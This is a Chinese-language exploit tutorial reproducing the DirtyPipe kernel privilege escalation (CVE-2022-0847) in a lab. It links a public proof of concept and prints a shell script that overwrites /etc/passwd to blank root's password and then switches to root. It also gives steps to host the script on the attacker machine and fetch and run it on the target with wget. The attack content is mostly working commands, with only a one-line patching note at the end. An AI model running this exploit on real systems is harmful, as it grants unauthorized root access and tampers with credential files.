# Linux脏管道提权

漏洞复现-DirtyPipe提权(CVE-2022-0847)

##### 0x00 前言 

> 此漏洞自 5.8 版本起就已存在。非 root 用户通过**注入和覆盖只读文件中的数据**，从而获得 root 权限。因为非特权进程可以将代码注入 root 进程。

漏洞利用条件：

> 1、内核影响版本：5.8 <= Linux kernel < 5.16.11/5.15.25/5.10.102
>
> 2、被覆写的目标文件必须拥有可读权限。

`uname -a`查看内核版本

|          | 攻击者         | 靶机           |
| -------- | -------------- | -------------- |
| 操作系统 | kali           | CentOS 7       |
| IP地址   | 192.168.12.135 | 192.168.12.131 |
| 内核     |                | 5.8.7          |

> 这里使用普通用户登录靶机，进行提权，前期入侵操作默认完成

**0x01 下载poc代码**

```
https://github.com/r1is/CVE-2022-0847/blob/main/Dirty-Pipe.sh
```

查看文件，原理

```shell
gcc exp.c -o exp -std=c99

# 备份密码文件
rm -f /tmp/passwd
cp /etc/passwd /tmp/passwd
if [ -f "/tmp/passwd" ];then
	echo "/etc/passwd已备份到/tmp/passwd"
	passwd_tmp=$(cat /etc/passwd|head)
	./exp /etc/passwd 1 "${passwd_tmp/root:x/oot:}"

	echo -e "\n# 恢复原来的密码\nrm -rf /etc/passwd\nmv /tmp/passwd /etc/passwd"

	# 现在可以无需密码切换到root账号
	su root
```

将文件存入`/tmp`目录下，开启web服务

```shell
cd /tmp

python -m http.server 8080
```



**0x02 在靶机运行poc代码**

```shell
# 下载poc到靶机，如果连的上github，就不用自己部署云上
wget http://192.168.12.135:8080/Dirty-Pipe.sh

# 添加权限
chmod a+x Dirty-Pipe.sh

# 运行代码
./Dirty-Pipe.sh

# 查看
id
whoami
# 是root就成功
```

![image-20230225181744462](https://s2.loli.net/2023/02/27/wfQ7EBvbsVCz4FA.png)

**0x03 修复建议**

更新系统内核为已修复该漏洞的版本。